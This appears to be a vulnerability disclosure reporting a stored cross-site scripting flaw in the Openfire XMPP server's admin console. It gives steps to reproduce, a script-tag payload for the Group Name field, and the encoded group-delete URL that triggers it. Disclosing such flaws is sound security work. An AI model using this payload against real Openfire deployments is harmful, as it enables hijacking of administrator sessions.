# Description

`org.igniterealtime.openfire:xmppserver` is vulnerable to `Cross-Site Scripting (XSS)`.

# Steps To Reproduce
1. Download openfire and install using https://www.igniterealtime.org/downloads/
2. Run the server http://localhost:9090/index.jsp
3. Click on "Users/Groups" http://localhost:9090/user-summary.jsp
4. Click on "Groups" http://localhost:9090/group-summary.jsp
5. Create new group http://localhost:9090/group-create.jsp
6. Insert payload in Group Name: a"><ScRiPt>alert('XSS')</ScRiPt> and create the grooup.
7. GO to Grooup summary http://localhost:9090/group-summary.jsp
8. click on delete XSS will be triggered. http://localhost:9090/group-delete.jsp?group=a%22%3E%3CScRiPt%3Ealert(%27XSS%27)%3C/ScRiPt%3E
